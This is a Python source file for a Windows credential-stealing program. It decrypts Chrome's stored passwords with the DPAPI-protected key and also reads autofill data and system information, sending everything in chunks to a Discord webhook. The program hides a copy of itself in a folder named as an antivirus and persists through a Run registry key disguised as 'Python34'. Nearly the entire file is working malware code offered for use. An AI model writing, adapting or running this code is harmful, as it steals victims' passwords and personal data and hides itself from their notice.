import os
import json
import shutil
import sqlite3
import tempfile
from Crypto.Cipher import AES
import base64
import win32crypt
import subprocess
import http.client
import urllib.parse
import requests
import ssl
import sys
import winreg as reg
import time

WEBHOOK_URL = ""

user_home_dir = os.path.expanduser("~")
target_relative_paths = {
    "Chrome": os.path.join(user_home_dir, "AppData", "Local", "Google", "Chrome", "User Data", "Default")
}

#----------------------------------------------------------------

def send_to_discord_webhook(content):
    headers = {
        'Content-Type': 'application/json'
    }
    payload = {
        'title': os.environ.get('COMPUTERNAME', ''),
        'content': content
    }
    try:
        response = requests.post(WEBHOOK_URL, headers=headers, data=json.dumps(payload))
        if response.status_code == 204:
            print("Data sent successfully to Discord")
        else:
            print(f"Failed to send data to Discord. Status code: {response.status_code}")
            print(f"Response content: {response.content}")
    except Exception as e:
        print(f"Error sending data to Discord: {str(e)}")


def split_in_chunks(data, chunk_size=1900):
    data_len = len(data)
    if data_len <= chunk_size:
        return [data]
    
    split_data = []
    number_of_chunks = (data_len + chunk_size - 1) // chunk_size  
    
    for chunk_index in range(number_of_chunks):
        start_index = chunk_index * chunk_size
        end_index = start_index + chunk_size
        split_data.append(data[start_index:end_index])
    
    return split_data

def create_hidden_dir():
    appdata_dir = os.getenv('APPDATA')
    hidden_dir = os.path.join(appdata_dir, 'MyHiddenAntivirus')
    if not os.path.exists(hidden_dir):
        os.makedirs(hidden_dir)
    return hidden_dir

def duplicate_script(hidden_dir):
    current_script_path = os.path.abspath(sys.argv[0])
    duplicated_script_path = os.path.join(hidden_dir, os.path.basename(current_script_path))
    shutil.copy2(current_script_path, duplicated_script_path)
    return duplicated_script_path

def add_to_startup(script_path):
    value_name = "Python34"
    key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
    reg.SetValueEx(registry_key, value_name, 0, reg.REG_SZ, script_path)
    reg.CloseKey(registry_key)

def remove_from_startup():
    value_name = "Python34"
    key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    try:
        registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
        reg.DeleteValue(registry_key, value_name)
        reg.CloseKey(registry_key)
    except FileNotFoundError:
        pass


#----------------------------------------------------------------

def make_temp_dir():
    temp_dir = tempfile.gettempdir()
    new_dir_name = "nrat_data_folder"
    new_dir_path = os.path.join(temp_dir, new_dir_name)
    
    os.makedirs(new_dir_path, exist_ok=True)
    
    if os.path.exists(new_dir_path):
        return new_dir_path
    else:
        return None

def get_chrome_db_path(db_name):
    return os.path.join(target_relative_paths["Chrome"], db_name)

def make_temp_copy_of_db(db_path):
    temp_dir_path = make_temp_dir()
    if temp_dir_path:
        temp_db_path = os.path.join(temp_dir_path, os.path.basename(db_path))
        try:
            shutil.copyfile(db_path, temp_db_path)
            return temp_db_path
        except FileNotFoundError:
            print(f"Warning: File '{db_path}' not found. Skipping...")
            return None
    else:
        raise Exception("Failed to create temporary directory")

def get_encryption_key():
    local_state_path = os.path.join(os.getenv('USERPROFILE'), r'AppData\Local\Google\Chrome\User Data\Local State')
    with open(local_state_path, "r", encoding='utf-8') as file:
        local_state = json.loads(file.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return decrypted_key

def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        encrypted_password = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_password)[:-16].decode()
    except Exception as e:
        return "Error decrypting password"

def extract_passwords(db_path, key):
    passwords = []
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[1]
        encrypted_password = row[2]
        decrypted_password = decrypt_password(encrypted_password, key)
        if username or decrypted_password:
            passwords.append(f"Origin URL: {origin_url}\nUsername: {username}\nPassword: {decrypted_password}\n")
    
    cursor.close()
    conn.close()
    return passwords

def extract_autofill_data(db_path):
    autofill_data = []
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute("SELECT name, value FROM autofill")
    
    for row in cursor.fetchall():
        name = row[0]
        value = row[1]
        autofill_data.append(f"Name: {name}\nValue: {value}\n")
    
    cursor.close()
    conn.close()
    return autofill_data

def save_to_txt(file_path, data):
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(data)

def get_system_info():
    try:
        result = subprocess.run(['systeminfo'], capture_output=True, text=True)
        
        if result.returncode == 0:
            system_info = result.stdout

            system_info_chunks = split_in_chunks("\n".join(system_info))
            
            for chunk in system_info_chunks:
                send_to_discord_webhook(chunk)

            return True
        
        else:
            return False
    
    except Exception as e:
        return f"Exception occurred: {str(e)}"
        

def get_chrome_data():
    try:
        temp_db_path_login = make_temp_copy_of_db(get_chrome_db_path("Login Data"))
        temp_db_path_history = make_temp_copy_of_db(get_chrome_db_path("History"))
        temp_db_path_bookmarks = make_temp_copy_of_db(get_chrome_db_path("Bookmarks"))
        temp_db_path_cookies = make_temp_copy_of_db(get_chrome_db_path("Cookies"))
        temp_db_path_web_data = make_temp_copy_of_db(get_chrome_db_path("Web Data"))
        
        encryption_key = get_encryption_key()
        
        passwords = extract_passwords(temp_db_path_login, encryption_key)
        autofill_data = extract_autofill_data(temp_db_path_web_data)
        password_chunks = split_in_chunks("\n".join(passwords))
        autofill_chunks = split_in_chunks("\n".join(autofill_data))
        
        for chunk in password_chunks:
            send_to_discord_webhook(chunk)
        
        for chunk in autofill_chunks:
            send_to_discord_webhook(chunk)
        
        print("Data sent successfully to Discord")
        
    except Exception as e:
        print(f"Error occurred: {str(e)}")
    
    finally:
        if temp_db_path_login:
            os.remove(temp_db_path_login)
        if temp_db_path_history:
            os.remove(temp_db_path_history)
        if temp_db_path_bookmarks:
            os.remove(temp_db_path_bookmarks)
        if temp_db_path_cookies:
            os.remove(temp_db_path_cookies)
        if temp_db_path_web_data:
            os.remove(temp_db_path_web_data)


def check_internet():   
    try:
        urllib.request.urlopen("https://www.google.com", timeout=1)
        return True
    except urllib.request.URLError:
        return False


hidden_dir = create_hidden_dir()
duplicated_script_path = duplicate_script(hidden_dir)
add_to_startup(duplicated_script_path)


while not check_internet():
    time.sleep(5)  

get_chrome_data()
get_system_info()